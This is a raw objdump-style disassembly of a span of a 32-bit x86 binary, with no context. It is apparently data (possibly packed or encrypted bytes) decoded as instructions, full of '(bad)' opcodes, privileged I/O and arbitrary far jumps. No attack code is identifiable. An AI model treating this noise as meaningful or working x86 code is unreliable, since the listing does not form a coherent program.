  41f0e2:	inc    edi
  41f0e3:	scas   al,BYTE PTR es:[edi]
  41f0e4:	jle    0x41f075
  41f0e6:	(bad)  
  41f0e7:	imul   eax,DWORD PTR [eax-0x1773b814],0x30
  41f0ee:	loope  0x41f0ef
  41f0f0:	cwde   
  41f0f1:	arpl   WORD PTR [edi+esi*4],cx
  41f0f4:	enter  0xaf01,0xd0
  41f0f8:	cmp    al,0xc2
  41f0fa:	es das 
  41f0fc:	sbb    al,0xdb
  41f0fe:	jne    0x41f0fd
  41f100:	rol    DWORD PTR [edi],1
  41f102:	cmp    BYTE PTR [edi-0x5],ah
  41f105:	outs   dx,BYTE PTR ds:[esi]
  41f106:	stc    
  41f107:	shr    BYTE PTR [ecx-0xb1e25a3],1
  41f10d:	pop    eax
  41f10e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f10f:	mov    ecx,0x1409824f
  41f114:	cmp    BYTE PTR gs:[eax+0x6bdd86bf],ch
  41f11b:	mov    edi,0x5c5c03ae
  41f120:	xchg   edi,eax
  41f121:	pusha  
  41f122:	je     0x41f174
  41f124:	jo     0x41f0ec
  41f126:	mov    bh,0x29
  41f128:	push   ebp
  41f129:	jbe    0x41f131
  41f12b:	cli    
  41f12c:	or     eax,0x2016a19b
  41f131:	mov    al,0x5
  41f133:	mov    ecx,0x7cac5b44
  41f138:	test   BYTE PTR [ebx+0x44],bl
  41f13b:	gs cli 
  41f13d:	imul   esi,DWORD PTR [edx-0x65fedfd2],0x62
  41f144:	shr    DWORD PTR [ecx+0x3],cl
  41f147:	mov    ecx,0xdb144e49
  41f14c:	aad    0xee
  41f14e:	xchg   ecx,eax
  41f14f:	xor    eax,DWORD PTR [edi-0x654d6514]
  41f155:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f156:	test   DWORD PTR [ebx+0x507a9b6d],0xd16f55d2
  41f160:	ud0    esp,DWORD PTR [edi]
  41f163:	stc    
  41f164:	scas   eax,DWORD PTR es:[edi]
  41f165:	push   ebx
  41f166:	retf   
  41f167:	jne    0x41f1b9
  41f169:	mov    ebx,0xf290054d
  41f16e:	mov    BYTE PTR [ebp+0x6e],bh
  41f171:	es pop ecx
  41f173:	sub    ecx,edi
  41f175:	jle    0x41f17e
  41f177:	jnp    0x41f195
  41f179:	sub    al,0x2b
  41f17b:	xor    edx,DWORD PTR [ebp+0x55f4f66c]
  41f181:	mov    esp,0xa4694281
  41f186:	(bad)  
  41f187:	xlat   BYTE PTR ds:[ebx]
  41f188:	(bad)  
  41f189:	into   
  41f18a:	sub    dh,BYTE PTR [esi]
  41f18c:	retf   0xff3b
  41f18f:	mov    bh,0xa2
  41f191:	fdiv   st(3),st
  41f193:	lods   al,BYTE PTR ds:[esi]
  41f194:	ret    0xf1fe
  41f197:	mov    ecx,edx
  41f199:	retf   0xa20d
  41f19c:	mov    ah,0x95
  41f19e:	push   ds
  41f19f:	imul   ebp,DWORD PTR [esi+0x14],0x40420c60
  41f1a6:	enter  0xb85c,0x2c
  41f1aa:	cwde   
  41f1ab:	mov    ecx,DWORD PTR [ebx-0x742a8484]
  41f1b1:	sbb    eax,0x69b85299
  41f1b6:	pop    es
  41f1b7:	push   eax
  41f1b8:	adc    edi,DWORD PTR [eax+ebx*8+0x1a21f6ae]
  41f1bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1c0:	stc    
  41f1c1:	pushf  
  41f1c2:	jne    0x41f20d
  41f1c4:	or     ebx,0x21
  41f1c7:	inc    ebx
  41f1c8:	test   al,0x14
  41f1ca:	xchg   ecx,eax
  41f1cb:	mov    ebp,0xc09b85b2
  41f1d0:	mov    esp,eax
  41f1d2:	repnz test DWORD PTR [ebp-0x6c3c47b5],0xa8b18716
  41f1dd:	sbb    ecx,ebx
  41f1df:	scas   al,BYTE PTR es:[edi]
  41f1e0:	xchg   ecx,eax
  41f1e1:	pop    ss
  41f1e2:	rol    DWORD PTR [eax-0x16],0x6e
  41f1e6:	mov    bh,0xff
  41f1e8:	or     bl,BYTE PTR [eax-0x4500e910]
  41f1ee:	clc    
  41f1ef:	pop    edx
  41f1f0:	mov    ah,0x99
  41f1f2:	jg     0x41f261
  41f1f4:	push   esp
  41f1f5:	cmp    eax,0x468913c4
  41f1fa:	xchg   DWORD PTR [edx+0x29cff35a],ebx
  41f200:	jno    0x41f211
  41f202:	xor    bh,dl
  41f204:	adc    ah,ah
  41f206:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f207:	adc    BYTE PTR [esi],dh
  41f209:	push   esp
  41f20a:	cmp    eax,0x98d9f30
  41f20f:	mov    ah,0xb7
  41f211:	pop    ds
  41f212:	jb     0x41f277
  41f214:	xor    esi,DWORD PTR [ecx]
  41f216:	mov    ebx,0x3fa67288
  41f21b:	xchg   BYTE PTR [esi],ah
  41f21d:	add    eax,0x83795cbb
  41f222:	jl     0x41f1bf
  41f224:	mov    dh,0x65
  41f226:	or     dl,dh
  41f228:	dec    edx
  41f229:	adc    ebp,edx
  41f22b:	jmp    0x5cb44a5
  41f230:	and    BYTE PTR [ebp+0x2f],ah
  41f233:	sub    dh,BYTE PTR cs:[edi]
  41f236:	arpl   WORD PTR [eax],cx
  41f238:	adc    BYTE PTR [edi+0x5d],ch
  41f23b:	and    BYTE PTR [ecx+0x3afc1e15],cl
  41f241:	jge    0x41f25d
  41f243:	mov    bh,0xa
  41f245:	xchg   esp,eax
  41f246:	(bad)  
  41f247:	cmp    edx,DWORD PTR [edx-0x7a]
  41f24a:	cmp    al,0x8c
  41f24c:	adc    ecx,esp
  41f24e:	in     eax,dx
  41f24f:	loopne 0x41f2cb
  41f251:	add    DWORD PTR [edx-0xe],esp
  41f254:	jne    0x41f1eb
  41f256:	js     0x41f2a8
  41f258:	xor    eax,0x23c183d3
  41f25d:	and    al,0xcb
  41f25f:	nop
  41f260:	xchg   esi,eax
  41f261:	xchg   esi,eax
  41f262:	ss or  eax,0xc2a3e4ff
  41f268:	mov    ch,0x4b
  41f26a:	push   cs
  41f26b:	mov    esi,0x4322b92d
  41f270:	pop    ds
  41f271:	loop   0x41f20b
  41f273:	jns    0x41f297
  41f275:	mov    WORD PTR [edi],?
  41f277:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f278:	cmp    bh,BYTE PTR [eax*4-0x7a5c018b]
  41f27f:	bound  esi,QWORD PTR [edx+0x755609ff]
  41f285:	push   ecx
  41f286:	xchg   DWORD PTR [ebp+0x69435a85],edx
  41f28c:	ins    BYTE PTR es:[edi],dx
  41f28d:	adc    ax,0xdddc
  41f291:	cmc    
  41f292:	enter  0x38e7,0x62
  41f296:	pop    ecx
  41f297:	fistp  DWORD PTR ds:0xf24558c4
  41f29d:	clc    
  41f29e:	push   ebx
  41f29f:	and    esp,DWORD PTR [ecx-0x4a]
  41f2a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2a3:	arpl   sp,ax
  41f2a5:	inc    esp
  41f2a6:	xor    al,0x88
  41f2a8:	sbb    BYTE PTR [edi],dl
  41f2aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2ab:	adc    eax,0x75f4cacc
  41f2b1:	fisttp DWORD PTR [ecx+0x737677dd]
  41f2b7:	and    eax,0xcc5ef400
  41f2bc:	pop    ss
  41f2bd:	jmp    0xe080ab1f
  41f2c2:	test   eax,0xbb3f79c6
  41f2c7:	iret   
  41f2c8:	daa    
  41f2c9:	dec    edx
  41f2ca:	mov    WORD PTR [edi],ds
  41f2cc:	into   
  41f2cd:	cmp    BYTE PTR [ecx],dl
  41f2cf:	adc    eax,0x4b0b111d
  41f2d4:	jmp    0x41f2fc
  41f2d6:	test   al,0x1
  41f2d8:	aam    0x22
  41f2da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2db:	je     0x41f318
  41f2dd:	dec    esi
  41f2de:	cmp    dh,al
  41f2e0:	jo     0x41f35d
  41f2e2:	mov    esp,0x7b6019de
  41f2e7:	in     al,dx
  41f2e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2e9:	mov    esi,0xda2a66a7
  41f2ee:	pop    edi
  41f2ef:	cmp    DWORD PTR [ebx],ebx
  41f2f1:	imul   ebx,DWORD PTR [ecx+0x491f15ea],0x252c4115
  41f2fb:	dec    edx
  41f2fc:	jo     0x41f2e1
  41f2fe:	sbb    eax,0x26bae0c3
  41f303:	add    eax,0xb1753549
  41f308:	bound  esi,QWORD PTR [ebx+0xb]
  41f30b:	sub    bh,BYTE PTR [ebp-0x3a]
  41f30e:	(bad)
  41f311:	inc    ebp
  41f312:	jb     0x41f389
  41f314:	inc    ebx
  41f315:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f316:	push   0xc9e313c3
  41f31b:	clc    
  41f31c:	out    dx,al
  41f31d:	call   0x8fc84c20
  41f322:	lea    edx,[ecx]
  41f324:	scas   eax,DWORD PTR es:[edi]
  41f325:	popa   
  41f326:	cmp    al,0x53
  41f328:	test   BYTE PTR [edi+0x4a],0xbe
  41f32c:	hlt    
  41f32d:	fidiv  WORD PTR [edx-0x5613f266]
  41f333:	adc    DWORD PTR [ebx],0xffffff94
  41f336:	in     eax,0xc4
  41f338:	test   eax,edx
  41f33a:	and    al,0xb7
  41f33c:	out    dx,al
  41f33d:	scas   al,BYTE PTR es:[edi]
  41f33e:	push   ebx
  41f33f:	jb     0x41f2e7
  41f341:	dec    eax
  41f342:	retf   0x8280
  41f345:	adc    ch,cl
  41f347:	inc    ebx
  41f348:	stos   BYTE PTR es:[edi],al
  41f349:	mov    ebx,0xa3e8be35
  41f34e:	je     0x41f3b9
  41f350:	dec    ecx
  41f351:	ja     0x41f2fe
  41f353:	icebp  
  41f354:	call   0x5c044497
  41f359:	fwait
  41f35a:	out    dx,eax
  41f35b:	es scas al,BYTE PTR es:[edi]
  41f35d:	and    al,0xd
  41f35f:	sub    BYTE PTR [ebx],al
  41f361:	jg     0x41f34c
  41f363:	xor    eax,eax
  41f365:	inc    edx
  41f366:	ret    
  41f367:	leave  
  41f368:	inc    ebx
  41f369:	retf   0x4b33
  41f36c:	mov    DWORD PTR [edx],edi
  41f36e:	ins    BYTE PTR es:[edi],dx
  41f36f:	and    eax,0xa88f8256
  41f374:	sbb    DWORD PTR [eax],0xffffffeb
  41f377:	imul   edx,DWORD PTR [edi],0xe51d4870
  41f37d:	inc    BYTE PTR [esp+edx*8]
  41f380:	or     ah,BYTE PTR [edi-0x4e]
  41f383:	adc    ecx,DWORD PTR [esi-0xc3d0918]
  41f389:	sbb    BYTE PTR ss:[esi-0x2],bl
  41f38d:	shr    BYTE PTR [ebx+0x47b31f13],0x2a
  41f394:	sbb    al,0x5a
  41f396:	adc    BYTE PTR [ecx+0x71],0xe6
  41f39a:	test   DWORD PTR es:[edi-0x7c307293],ecx
  41f3a1:	scas   al,BYTE PTR es:[edi]
  41f3a2:	pop    es
  41f3a3:	xchg   DWORD PTR ds:0x32028be9,edx
  41f3a9:	sbb    edx,DWORD PTR [esi+0x8]
  41f3ac:	sbb    ebx,DWORD PTR [ebx+0x24]
  41f3af:	sbb    eax,0x4ba2ffa2
  41f3b4:	sahf   
  41f3b5:	pop    esp
  41f3b6:	dec    esp
  41f3b7:	jg     0x41f3f5
  41f3b9:	fwait
  41f3ba:	mov    esp,0x38185a43
  41f3bf:	xchg   edi,eax
  41f3c0:	adc    al,0x8c
  41f3c2:	xor    DWORD PTR [edi],ecx
  41f3c4:	fwait
  41f3c5:	push   esi
  41f3c6:	jle    0x41f36e
  41f3c8:	cmc    
  41f3c9:	and    DWORD PTR [eax-0x5c],0x2e
  41f3cd:	pop    edx
  41f3ce:	ret    0x4c23
  41f3d1:	mov    ebx,0xd54a5436
  41f3d6:	and    eax,0x216a3cbc
  41f3db:	mov    ch,0xf
  41f3dd:	ss push ebx
  41f3df:	imul   edx,DWORD PTR [ecx+0x60],0x51
  41f3e3:	mov    ds:0x3c415570,eax
  41f3e8:	ins    DWORD PTR es:[edi],dx
  41f3e9:	fild   DWORD PTR [esi-0x4d95f8da]
  41f3ef:	mov    ?,WORD PTR [ebx]
  41f3f1:	nop
  41f3f2:	aam    0xe
  41f3f4:	idiv   BYTE PTR [edx]
  41f3f6:	jmp    0x41f403
  41f3f8:	and    BYTE PTR [ebx],bh
  41f3fa:	push   ss
  41f3fb:	stos   DWORD PTR es:[edi],eax
  41f3fc:	and    eax,edi
  41f3fe:	icebp  
  41f3ff:	ror    BYTE PTR [ebp+0x5c],0x59
  41f403:	pop    es
  41f404:	sti    
  41f405:	cmp    eax,0xa1ec82c9
  41f40a:	outs   dx,DWORD PTR ds:[esi]
  41f40b:	xchg   DWORD PTR [edx],ebp
  41f40d:	push   ebx
  41f40e:	int    0x8a
  41f410:	add    BYTE PTR [esi],ch
  41f412:	fidiv  WORD PTR [ecx]
  41f414:	nop
  41f415:	call   0x93e5ae49
  41f41a:	push   es
  41f41b:	sbb    al,0x53
  41f41d:	pop    ss
  41f41e:	pushf  
  41f41f:	and    edi,ebx
  41f421:	inc    eax
  41f422:	add    eax,0xc0a8312e
  41f427:	dec    ecx
  41f428:	fadd   DWORD PTR [esi]
  41f42a:	fdivr  QWORD PTR [ebx+0x66]
  41f42d:	adc    DWORD PTR [ebx-0x6834e555],esi
  41f433:	inc    ebp
  41f434:	stos   DWORD PTR es:[edi],eax
  41f435:	out    dx,al
  41f436:	imul   edi,eax,0x3a
  41f439:	fs ins BYTE PTR es:[edi],dx
  41f43b:	scas   al,BYTE PTR es:[edi]
  41f43c:	out    0xad,al
  41f43e:	pop    ebx
  41f43f:	cmp    al,0xba
  41f441:	xchg   ebx,eax
  41f442:	imul   edx
  41f444:	out    dx,eax
  41f445:	and    BYTE PTR ds:0x852645a4,0xb6
  41f44c:	sbb    esi,DWORD PTR [esi+0x5113bc61]
  41f452:	cdq    
  41f453:	push   cs
  41f454:	sbb    ebp,ebp
  41f456:	lahf   
  41f457:	ret    0x55a7
  41f45a:	mov    ecx,0x19502b00
  41f45f:	cs out 0xdc,al
  41f462:	mov    ch,0xc
  41f464:	test   BYTE PTR [ecx],dl
  41f466:	outs   dx,BYTE PTR ds:[esi]
  41f467:	adc    eax,0xe12dcbcf
  41f46c:	mov    ds:0x808b4b52,al
  41f471:	mov    esp,0x2578c359
  41f476:	shl    esi,cl
  41f478:	xchg   esi,eax
  41f479:	aad    0x67
  41f47b:	sbb    al,BYTE PTR [eax]
  41f47d:	lods   al,BYTE PTR ds:[esi]
  41f47e:	sub    BYTE PTR [ebx],ch
  41f480:	pop    esp
  41f481:	dec    ebx
  41f482:	and    eax,0x1ba28ecc
  41f487:	jl     0x41f44c
  41f489:	gs pop esp
  41f48b:	and    eax,0xd27addf7
  41f490:	ds sub ch,bh
  41f493:	pop    ebp
  41f494:	adc    bh,BYTE PTR [edx-0x55fe779f]
  41f49a:	dec    ebx
  41f49b:	in     eax,0x8b
  41f49d:	mov    ds:0x863f581e,al
  41f4a2:	test   al,0xeb
  41f4a4:	into   
  41f4a5:	xchg   esi,eax
  41f4a6:	inc    edx
  41f4a7:	jo     0x41f4cb
  41f4a9:	mov    esi,0x77ab20cf
  41f4ae:	pop    edi
  41f4af:	push   ebx
  41f4b0:	mov    edi,ebx
  41f4b2:	aam    0x45
  41f4b4:	inc    esi
  41f4b5:	ja     0x41f48c
  41f4b7:	jns    0x41f4f6
  41f4b9:	ret    
  41f4ba:	inc    edi
  41f4bb:	mov    dh,0xb8
  41f4bd:	mov    edi,0xfddeb94b
  41f4c2:	cs fwait
  41f4c4:	hlt    
  41f4c5:	sub    ebp,DWORD PTR [edx+0x75]
  41f4c8:	push   ebx
  41f4c9:	add    al,0xd8
  41f4cb:	jl     0x41f46a
  41f4cd:	rcr    DWORD PTR [edx-0x5c],cl
  41f4d0:	jmp    0xd40e:0x168afca
  41f4d7:	dec    esi
  41f4d8:	add    esi,DWORD PTR [edx+0x27]
  41f4db:	mov    ds:0xd482b32b,eax
  41f4e0:	inc    esi
  41f4e1:	mov    DWORD PTR ds:0xce7ca915,edi
  41f4e7:	ins    BYTE PTR es:[edi],dx
  41f4e8:	sub    ebp,esi
  41f4ea:	call   0xbeb6:0xa0cb5934
  41f4f1:	mov    ds:0xd36d73b4,eax
  41f4f6:	xor    DWORD PTR [edi-0x56],0xb9b9ac5
  41f4fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4fe:	(bad)  
  41f4ff:	cld    
  41f500:	in     al,0x18
  41f502:	aad    0xb8
  41f504:	out    dx,eax
  41f505:	pop    ebx
  41f506:	std    
  41f507:	jbe    0x41f55c
  41f509:	aaa    
  41f50a:	jnp    0x41f57e
  41f50c:	cmp    DWORD PTR [ebx+0x62],edi
  41f50f:	test   eax,0x7b8c12e4
  41f514:	sbb    edi,DWORD PTR [eax+0x7f]
  41f517:	cs mov dh,0xae
  41f51a:	aad    0x79
  41f51c:	ror    BYTE PTR [edi],1
  41f51e:	jb     0x41f546
  41f520:	in     eax,0x1
  41f522:	mov    BYTE PTR [eax+0x23],0x75
  41f526:	bound  edx,QWORD PTR [ebx+0x59]
  41f529:	xchg   ecx,eax
  41f52a:	aad    0xca
  41f52c:	inc    esi
  41f52d:	and    al,0xbf
  41f52f:	xor    BYTE PTR [eax-0xa],al
  41f532:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f533:	xchg   ebx,eax
  41f534:	(bad)  [ebx-0x80]
  41f537:	repnz fadd QWORD PTR [esp+ebp*1]
  41f53b:	test   al,0x53
  41f53d:	(bad)  
  41f53e:	ror    BYTE PTR [ecx],cl
  41f540:	retf   0x3d6f
  41f543:	push   ebp
  41f544:	jmp    0x4280b042
  41f549:	seta   ah
  41f54c:	call   0x17dd:0xed833a68
  41f553:	mov    WORD PTR [edi+0x22],cs
  41f556:	mov    ebx,0x2a0da5f0
  41f55b:	out    0xbe,al
  41f55d:	push   ds
  41f55e:	repz (bad) 
  41f561:	clts   
  41f563:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f564:	add    DWORD PTR [ecx],0xffffffc9
  41f567:	or     al,0xf9
  41f569:	and    al,0xce
  41f56b:	ret    
  41f56c:	stos   BYTE PTR es:[edi],al
  41f56d:	pusha  
  41f56e:	inc    ebx
  41f56f:	pop    ss
  41f570:	daa    
  41f571:	in     eax,dx
  41f572:	mov    edi,0x1c36225c
  41f577:	out    dx,eax
  41f578:	jnp    0x41f532
  41f57a:	sbb    eax,0xb01de7c0
  41f57f:	push   ebx
  41f580:	sti    
  41f581:	sub    al,0x2c
  41f583:	sub    ebp,DWORD PTR [edx-0x391de7ac]
  41f589:	aad    0xab
  41f58b:	lock pop ss
  41f58d:	retf   0x59c3
  41f590:	push   edx
  41f591:	pop    esi
  41f592:	pushf  
  41f593:	stos   BYTE PTR es:[edi],al
  41f594:	mov    al,ds:0xcc2ca255
  41f599:	cld    
  41f59a:	fwait
  41f59b:	xor    al,0x5d
  41f59d:	mov    bl,0x58
  41f59f:	jmp    0xdcbb5a5a
  41f5a4:	pop    ebx
  41f5a5:	int    0x8f
  41f5a7:	cld    
  41f5a8:	mov    dl,0x6b
  41f5aa:	push   ecx
  41f5ab:	and    DWORD PTR [esi],edi
  41f5ad:	hlt    
  41f5ae:	popa   
  41f5af:	in     al,0x92
  41f5b1:	sbb    esp,DWORD PTR [ecx+0x2d]
  41f5b4:	in     al,dx
  41f5b5:	push   ss
  41f5b6:	inc    esp
  41f5b7:	bound  ebx,QWORD PTR [edi+0x2b17717]
  41f5bd:	cmp    al,0x6d
  41f5bf:	adc    dl,cl
  41f5c1:	lss    ebx,FWORD PTR [edx+0x5e]
  41f5c5:	mov    ah,0x56
  41f5c7:	shl    bh,1
  41f5c9:	lds    edi,FWORD PTR [edi+0x715043c2]
  41f5cf:	sti    
  41f5d0:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41f5d2:	pop    eax
  41f5d3:	xor    BYTE PTR [esi+0x31],cl
  41f5d6:	int3   
  41f5d7:	mov    al,0xe2
  41f5d9:	out    0x33,eax
  41f5db:	clc    
  41f5dc:	into   
  41f5dd:	mov    ss,edx
  41f5df:	jo     0x41f57e
  41f5e1:	sub    esp,DWORD PTR [esi+ebp*2+0x20]
  41f5e5:	ins    DWORD PTR es:[edi],dx
  41f5e6:	in     eax,dx
  41f5e7:	adc    eax,DWORD PTR [ebx-0x4c801a99]
  41f5ed:	push   eax
  41f5ee:	(bad)  
  41f5ef:	mov    edx,0x49127e9
  41f5f4:	dec    eax
  41f5f5:	cmp    DWORD PTR [edx],ebx
  41f5f7:	jmp    0x2e99d64
  41f5fc:	aaa    
  41f5fd:	loopne 0x41f5e8
  41f5ff:	jb     0x41f650
  41f601:	cmp    bl,BYTE PTR [ebp-0x2c]
  41f604:	fwait
  41f605:	mov    dh,0xee
  41f607:	or     BYTE PTR [eax],0xfa
  41f60a:	stos   BYTE PTR es:[edi],al
  41f60b:	pop    ds
  41f60c:	ret    
  41f60d:	leave  
  41f60e:	stos   BYTE PTR es:[edi],al
  41f60f:	test   edx,0x3112e38a
  41f615:	(bad)
  41f619:	stos   DWORD PTR es:[edi],eax
  41f61a:	jecxz  0x41f5ad
  41f61c:	xchg   BYTE PTR [eax+edx*1+0x77],ah
  41f620:	gs out dx,eax
  41f622:	loop   0x41f638
  41f624:	(bad)  
  41f626:	jbe    0x41f5b4
  41f628:	cmp    bl,BYTE PTR [eax]
  41f62a:	(bad)  
  41f62b:	jo     0x41f68e
  41f62d:	test   DWORD PTR ds:0xff9130d5,esp
  41f633:	out    0xf0,al
  41f635:	and    BYTE PTR [ecx+0x5439110c],0xad
  41f63c:	mov    ebp,edx
  41f63e:	pop    edx
  41f63f:	adc    al,0x87
  41f641:	fwait
  41f642:	xchg   edx,eax
  41f643:	push   ss
  41f644:	dec    esi
  41f645:	adc    esi,0x48
  41f648:	pop    ebx
  41f649:	imul   edx,DWORD PTR [edi+0x56],0x909ff0d3
  41f650:	das    
  41f651:	pushf  
  41f652:	retf   
  41f653:	pusha  
  41f654:	ja     0x41f5f5
  41f656:	jne    0x41f5e4
  41f658:	shr    BYTE PTR [edi],cl
  41f65a:	leave  
  41f65b:	add    al,BYTE PTR [ebp-0x43c3e452]
  41f661:	or     BYTE PTR [edi],0xd8
  41f664:	mov    ecx,0xaa201c3e
  41f669:	adc    al,0x15
  41f66b:	add    eax,0x11baf238
  41f670:	aam    0x98
  41f672:	sub    ch,BYTE PTR [edx]
  41f674:	aas    
  41f675:	out    dx,al
  41f676:	dec    esp
  41f677:	inc    ebp
  41f678:	xor    ecx,DWORD PTR [ebp+0x33]
  41f67b:	scas   al,BYTE PTR es:[edi]
  41f67c:	jns    0x41f6e4
  41f67e:	in     al,dx
  41f67f:	xchg   DWORD PTR [ecx+ecx*8+0x1f812dd0],eax
  41f686:	aaa    
  41f687:	and    ah,BYTE PTR [esi]
  41f689:	pop    edx
  41f68a:	js     0x41f613
  41f68c:	pop    ebp
  41f68d:	(bad)  
  41f68e:	fisub  WORD PTR [esi]
  41f690:	hlt    
  41f691:	out    0x87,eax
  41f693:	arpl   WORD PTR [ebp+eax*2-0x5e],di
  41f697:	dec    esp
  41f698:	(bad)  
  41f699:	pop    esi
  41f69a:	sub    BYTE PTR [edi-0x5502b56b],cl
  41f6a0:	pop    ebx
  41f6a1:	jnp    0x41f6bd
  41f6a3:	test   DWORD PTR [ecx-0x70],ebx
  41f6a6:	fxrstor [ebx-0x2968fb16]
  41f6ad:	fsubr  QWORD PTR [eax-0x6fccb100]
  41f6b3:	push   esi
  41f6b4:	sbb    DWORD PTR [ebx+0x786dcab8],ecx
  41f6ba:	(bad)  
  41f6bb:	dec    esi
  41f6bc:	(bad)  
  41f6be:	inc    eax
  41f6bf:	outs   dx,DWORD PTR ds:[esi]
  41f6c0:	retf   
  41f6c1:	fwait
  41f6c2:	jecxz  0x41f71d
  41f6c4:	cmp    bl,BYTE PTR [ecx+0x18]
  41f6c7:	clc    
  41f6c8:	retf   0x7496
  41f6cb:	add    ch,BYTE PTR ss:[edi-0x4ac95713]
  41f6d2:	cmp    DWORD PTR [ebp-0x5c2cbb16],0xffffffa1
  41f6d9:	push   es
  41f6da:	cmp    bl,BYTE PTR [edi-0x2922a7ff]
  41f6e0:	repnz and al,0xda
  41f6e3:	jns    0x41f74d
  41f6e5:	(bad)  
  41f6e6:	mov    bl,0xea
  41f6e8:	cs cmp esp,esp
  41f6eb:	push   0xffffffc6
  41f6ed:	pop    es
  41f6ee:	int3   
  41f6ef:	fcmovnb st,st(3)
  41f6f1:	mul    ebp
  41f6f3:	cdq    
  41f6f4:	call   0x150a:0x7b07de68
  41f6fb:	outs   dx,BYTE PTR ds:[esi]
  41f6fd:	outs   dx,DWORD PTR ds:[esi]
  41f6fe:	and    eax,0x3a18bd70
  41f703:	cli    
  41f704:	sbb    edi,ebx
  41f706:	ret    0x4d3a
  41f709:	std    
  41f70a:	inc    edi
  41f70b:	test   al,0x11
  41f70d:	ins    BYTE PTR es:[edi],dx
  41f70e:	dec    ecx
  41f70f:	jnp    0x41f6f8
  41f711:	leave  
  41f712:	mov    eax,ds:0x54b9f09
  41f717:	jne    0x41f75c
  41f719:	call   0xdeee:0xc9ab02ed
  41f720:	xchg   ebx,eax
  41f721:	mov    esp,0xbd4d976e
  41f726:	(bad)  
  41f727:	sbb    bl,BYTE PTR [esi-0x54]
  41f72a:	out    0x60,al
  41f72c:	mov    al,ds:0xc8cc3956
  41f731:	mov    ebp,0x70df1ecf
  41f736:	cli    
  41f737:	or     esi,DWORD PTR [eax]
  41f739:	ins    DWORD PTR es:[edi],dx
  41f73a:	cmp    BYTE PTR [ebx+0x1],ch
  41f73d:	punpcklwd mm1,mm7
  41f740:	jecxz  0x41f746
  41f742:	mov    dl,0xa3
  41f744:	cmp    al,0xec
  41f746:	loop   0x41f7ab
  41f748:	repnz adc al,0xe9
  41f74b:	jp     0x41f769
  41f74d:	aaa    
  41f74e:	lahf   
  41f74f:	cmp    DWORD PTR [ecx],edx
  41f751:	nop
  41f752:	(bad)  
  41f753:	fisttp WORD PTR [eax-0xc680225]
  41f759:	dec    ecx
  41f75a:	in     eax,0xed
  41f75c:	xchg   ebx,eax
  41f75d:	pop    ecx
  41f75e:	jmp    0x8dfb8715
  41f763:	outs   dx,BYTE PTR ds:[esi]
  41f764:	push   ebp
  41f765:	(bad)  
  41f766:	fist   WORD PTR [ebp-0x7e26a8ea]
  41f76c:	enter  0x27e3,0x31
  41f770:	pop    ss
  41f771:	jp     0x41f71a
  41f773:	cld    
  41f774:	jmp    0xe4a02993
  41f779:	xchg   esi,eax
  41f77a:	inc    edi
  41f77b:	imul   ebp,DWORD PTR [ebx],0xffffff87
  41f77e:	xchg   esi,eax
  41f77f:	js     0x41f7ef
  41f781:	dec    ecx
  41f782:	out    0x20,al
  41f784:	xor    dl,BYTE PTR [ebp+0x71aceee6]
  41f78a:	pop    ss
  41f78b:	ds call 0xe489c5da
  41f791:	push   ebx
  41f792:	xchg   edi,eax
  41f793:	pop    ecx
  41f794:	mov    bh,BYTE PTR [eax+0x5f]
  41f797:	iret   
  41f798:	call   0x7ff18b63
  41f79d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f79e:	(bad)  
  41f79f:	pop    eax
  41f7a0:	outs   dx,DWORD PTR ds:[esi]
  41f7a1:	push   0xffffffea
  41f7a3:	dec    esi
  41f7a4:	sub    ecx,edx
  41f7a6:	push   es
  41f7a7:	lahf   
  41f7a8:	clc    
  41f7a9:	scas   al,BYTE PTR es:[edi]
  41f7aa:	jecxz  0x41f7f0
  41f7ac:	fist   WORD PTR [ecx]
  41f7ae:	bound  edi,QWORD PTR [edx-0x2f7719b4]
  41f7b4:	ja     0x41f7b0
  41f7b6:	xor    cl,BYTE PTR [eax]
  41f7b8:	pusha  
  41f7b9:	dec    eax
  41f7ba:	pop    es
  41f7bb:	jns    0x41f7f2
  41f7bd:	retf   0x72ab
  41f7c0:	xor    DWORD PTR [edi+ebx*2-0x3d57917a],0xa
  41f7c8:	in     al,0x68
  41f7ca:	jle    0x41f80a
  41f7cc:	out    dx,al
  41f7cd:	cs sub eax,0xa819a472
  41f7d3:	dec    edx
  41f7d4:	leave  
  41f7d5:	enter  0xad49,0x29
  41f7d9:	fistp  WORD PTR [ebx]
  41f7db:	fisttp DWORD PTR [eax+0x25]
  41f7de:	test   DWORD PTR [ebp-0x3d],0x1c7ed33f
  41f7e5:	dec    esp
  41f7e6:	ins    DWORD PTR es:[edi],dx
  41f7e7:	pop    esp
  41f7e8:	jo     0x41f824
  41f7ea:	add    BYTE PTR [ecx-0x2a],bl
  41f7ed:	jb     0x41f7e0
  41f7ef:	mov    bh,0x6
  41f7f1:	or     BYTE PTR [ebx-0x34],dl
  41f7f4:	sahf   
  41f7f5:	xchg   ebp,eax
  41f7f6:	out    dx,eax
  41f7f7:	sti    
  41f7f8:	out    dx,al
  41f7f9:	adc    al,0xa6
  41f7fb:	pop    es
  41f7fc:	loope  0x41f854
  41f7fe:	xlat   BYTE PTR ds:[ebx]
  41f7ff:	pushf  
  41f800:	ret    0x2577
  41f803:	push   ds
  41f804:	jno    0x41f7b0
  41f806:	rcl    edx,cl
  41f808:	scas   al,BYTE PTR es:[edi]
  41f809:	jmp    0x41f844
  41f80b:	push   ds
  41f80c:	add    dh,ah
  41f80e:	lock ins DWORD PTR es:[edi],dx
  41f810:	and    BYTE PTR [edx],cl
  41f812:	imul   ebx,DWORD PTR [eax+0x14],0xffffffc4
  41f816:	imul   ebx,DWORD PTR [ebx+0xf],0xd89b57fa
  41f81d:	xchg   esi,eax
  41f81e:	call   0x87da:0xcf12f1f1
